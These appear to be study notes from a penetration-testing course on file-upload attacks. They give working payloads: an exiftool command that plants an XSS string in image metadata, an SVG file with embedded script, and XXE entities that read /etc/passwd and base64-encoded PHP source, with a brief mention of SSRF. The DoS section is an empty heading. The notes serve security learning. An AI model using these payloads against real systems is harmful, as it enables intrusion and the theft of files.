## XSS
**HTML
1. JavaScript code: target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines
2. Web applications that display an image's metadata after its upload: can use a comment to make a comment in the metadata
```shell-session
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```
- if we change the image's MIME-Type to text/html, it will be executed even if the web app does no display the metadata

**SVG
Scalable Vector Graphics are XML-based images
```xml (HTB.svg)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE
Leak contents of /etc/passwd:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

We can read the source files of the web app as a result to
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
- Find more vulnerablities
- Locate the upload directory
- Identify allowed extensions
- Find the file naming scheme

XML data can be used in SVG, PDF, Word Documents, PowerPoint Documents

We can also perform SSRF with XXE to enumerate the internally availbale services or even call private APIs to perform private actions

## DoS

